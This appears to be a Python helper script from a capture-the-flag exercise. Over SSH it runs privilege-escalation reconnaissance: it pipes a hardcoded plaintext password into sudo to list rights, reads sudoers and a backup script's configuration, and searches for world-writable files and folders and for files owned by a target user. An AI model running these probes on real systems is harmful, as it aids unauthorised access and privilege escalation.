#!/usr/bin/env python3
"""Check sudo -l via -S (stdin password) and other quick win vectors."""
import sys
sys.path.insert(0, "/home/boss/Works/ctf/KPMG/VodooSpiritOfDeath2/artifacts")
from ssh_helper import connect, run

c = connect()
cmds = [
    "echo 'Onboard-Maya25!' | sudo -S -l 2>&1; echo RC=$?",
    "echo 'Onboard-Maya25!' | sudo -S -n true 2>&1; echo RC=$?",
    "ls -la /etc/sudoers.d/ 2>&1; ls -la /etc/sudoers 2>&1",
    "cat /usr/local/bin/acme-backup.sh 2>&1; echo ---; ls -la /etc/acme/ 2>&1; cat /etc/acme/backup.conf 2>&1",
    "find / -xdev -type f -perm -002 2>/dev/null | head -40",
    "find / -xdev -type f -user maya.chen -o -group maya.chen 2>/dev/null | grep -v /home/maya | head -40",
    "find / -xdev -type d -perm -002 2>/dev/null | head -40",
    "ls -la /usr/local/bin/ /opt/ 2>&1",
]
for cmd in cmds:
    run(c, cmd)
c.close()